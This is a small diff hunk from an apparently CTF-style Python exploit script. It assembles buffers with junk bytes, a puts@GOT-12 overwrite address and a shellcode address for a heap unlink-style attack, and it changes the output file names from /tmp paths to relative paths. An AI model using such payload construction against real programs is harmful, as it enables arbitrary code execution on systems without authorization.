@@ -27,7 +27,7 @@ buf3 += '\xff'*4  # junk
 buf3 += struct.pack('I', 0x804b128-12)  # puts@GOT-12
 buf3 += struct.pack('I', 0x804c040)  # address of the shellcode
 
-files = ["/tmpA", "/tmpB", "/tmpC"]
+files = ["tmpA", "tmpB", "tmpC"]
 
 buffers = [buf1, buf2, buf3]
 for f_name, buf in zip(files, buffers):
